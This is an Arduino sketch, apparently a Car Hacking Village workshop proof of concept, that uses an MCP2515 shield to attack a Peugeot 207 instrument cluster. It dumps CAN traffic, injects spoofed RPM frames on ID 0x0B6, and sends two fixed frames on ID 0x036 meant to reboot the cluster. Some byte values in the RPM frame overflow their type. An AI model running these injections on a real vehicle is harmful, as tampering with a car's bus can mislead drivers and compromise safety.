#include <mcp_can.h>
#include <SPI.h>

String command = "";
/*Basic commands*/

String input_str = "";
int end_command = 0;

//list of commands
void exec(); //not a command
void hi();
void help();
void candump();
void rpm_send();
void reboot();

// for candump
long unsigned int rxId;
unsigned char len = 0;
unsigned char rxBuf[8];
char msgString[128];

//for can fuzz
#define FUNCTIONAL_ID 0x0B6 /* RPM ID*/
byte counter = 0;
// CAN TX Variables
unsigned long prevTx = 0;
unsigned int invlTx = 1000;

// CAN RX Variables
unsigned long rxdID;
byte dlc;
byte rxdBuf[8];

// CAN Interrupt and Chip Select Pins
#define CAN0_INT 2                              /* Set INT to pin 2 (This rarely changes)   */
MCP_CAN CAN0(10);                               /* Set CS to pin 10 (Old shields use pin 10) */

void setup(){

  Serial.begin(115200);
  while(!Serial);
 
  // Initialize MCP2515 running at 8MHz with a baudrate of 125kb/s and the masks and filters disabled.
  if(CAN0.begin(MCP_STDEXT, CAN_125KBPS, MCP_8MHZ) == CAN_OK)
    Serial.println("\nMCP2515 Initialized Successfully!");
  else{
    Serial.println("Error Initializing MCP2515... Permanent failure!  Check your code & connections");
  }

  CAN0.setMode(MCP_NORMAL);                      // Set operation mode to normal so the MCP2515 sends acks to received data.

  // Having problems?  ======================================================
  // If you are not receiving any messages, uncomment the setMode line below
  // to test the wiring between the Ardunio and the protocol controller.
  // The message that this sketch sends should be instantly received.
  // ========================================================================
  //CAN0.setMode(MCP_LOOPBACK);

  pinMode(CAN0_INT, INPUT);                          // Configuring pin for /INT input
  Serial.println(" ####################################################################");
  Serial.println(" # Peugot 207 Instrument Cluster PoC Sketch                         #");
  Serial.println(" # Car Hacking on a Cheap w/ nano-can                               #");
  Serial.println(" # author: @shipcod3                                                #"); 
  Serial.println(" # ROOTCON Car Hacking Village                                      #");
  Serial.println(" ####################################################################");
  Serial.println(" ###                >> Type help to start                         ###");
  
}
void loop() { //Run repeatedly
  String command = input();
  end_command = 0; //Set the end_command back to 0
  input_str = "";  //Set the command back to "" (empty)
  exec(command);
  Serial.print(F("> "));
}
void exec(String command) {
  int done_exec = 0;
  //Find the command in the command list
  if(command == "hi"){hi(); done_exec = 1;}
  if(command == "help"){help(); done_exec = 1;}
  if(command == "candump"){candump(); done_exec = 1;}
  if(command == "rpm_send"){rpm_send(); done_exec = 1;}
  if(command == "reboot"){reboot(); done_exec = 1;}
  if(done_exec != 1){
    Serial.println(F("Error while execute command! You can try again! Maybe there isn't a command like that! If you retry and the command still error, please press reset!"));
  }
}

void hi() {
  Serial.println(F("Hello, welcome to CHV PH!"));  
}

void help() {
  Serial.println(F("========================================="));
  Serial.println(F("      -= Choose your poison! =-"));
  Serial.println(F("You can execute the following commands: "));
  Serial.println(F("hi  help  candump  rpm_send  reboot"));
  Serial.println(F("========================================="));
}

void candump(){
  counter = 0;
  while(counter<=5000){
  if(!digitalRead(CAN0_INT))                    // If CAN0_INT pin is low, read receive buffer
  {
    CAN0.readMsgBuf(&rxId, &len, rxBuf);      // Read data: len = data length, buf = data byte(s)
    
    if((rxId & 0x80000000) == 0x80000000)     // Determine if ID is standard (11 bits) or extended (29 bits)
      sprintf(msgString, "Extended ID: 0x%.8lX  DLC: %1d  Data:", (rxId & 0x1FFFFFFF), len);
    else
      sprintf(msgString, "Standard ID: 0x%.3lX       DLC: %1d  Data:", rxId, len);
  
    Serial.print(msgString);
  
    if((rxId & 0x40000000) == 0x40000000){    // Determine if message is a remote request frame.
      sprintf(msgString, " REMOTE REQUEST FRAME");
      Serial.print(msgString);
    } else {
      for(byte i = 0; i<len; i++){
        sprintf(msgString, " 0x%.2X", rxBuf[i]);
        Serial.print(msgString);
      }
    }
        
    Serial.println();
  }
  counter++;
  }
}

void rpm_send(){
  if(!digitalRead(CAN0_INT)){                         // If CAN0_INT pin is low, read receive buffer
 
    CAN0.readMsgBuf(&rxdID, &dlc, rxdBuf);             // Get CAN data - removing this will give you an error in sending message
  }
 
  if((millis() - prevTx) >= invlTx){
    prevTx = millis();
    byte txData[8] = {0x199, 0x00, 0x160};
    if(CAN0.sendMsgBuf(FUNCTIONAL_ID, 8, txData) == CAN_OK){
      Serial.println("Message Sent Successfully!");
    } else {
      Serial.println("Error Sending Message...");
    }
  }  
}

void reboot(){
  byte first_reboot_data[8] = {0x80,0x89,0x50,0x70,0x72,0xE0,0xF2,0x28};
  byte sec_reboot_data[8] = {0xB8,0x96,0xCF,0x44,0x9D,0x6A,0xAF,0x54};
  CAN0.sendMsgBuf(0x036, 0, 8, first_reboot_data);
  CAN0.sendMsgBuf(0x036, 0, 8, sec_reboot_data);
}

String input(){
  Serial.print("> ");
  while (end_command == 0){
    if (Serial.available() > 0) { //If the serial has incomming character, read it
      int incomingByte = Serial.read(); //Read the character ASCII number to the incomingByte varrible
      if (incomingByte == -1 | incomingByte == 10 | incomingByte == 13) { // Don't read the empty character like -1, 10 or 13 (enter)
        if (incomingByte == 13) { //If the user press enter
          end_command = 1; //Said that the input was ended
          Serial.println(input_str);
          return(input_str);
        }
      } else {
        char input_tmp = char(incomingByte); //Convert number to ASCII character
        //Serial.println(input_tmp); //For debug 
        input_str = String(input_str + input_tmp); //Add the character to the command string
      }
    }  
  }
}
/*********************************************************************************************************
  EOF
*********************************************************************************************************/
